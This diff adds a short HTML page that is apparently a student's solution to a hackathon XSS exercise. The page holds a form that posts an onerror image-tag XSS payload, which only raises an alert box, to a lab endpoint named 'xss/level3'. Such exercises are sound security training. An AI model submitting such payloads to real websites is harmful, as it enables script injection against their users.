@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Level 3 XSS</title>
+</head>
+
+<body>
+    <form action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php" method="POST">
+        <input type="hidden" name="input" value="<img src=x onerror=alert('Zaid');>">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+
+</html>
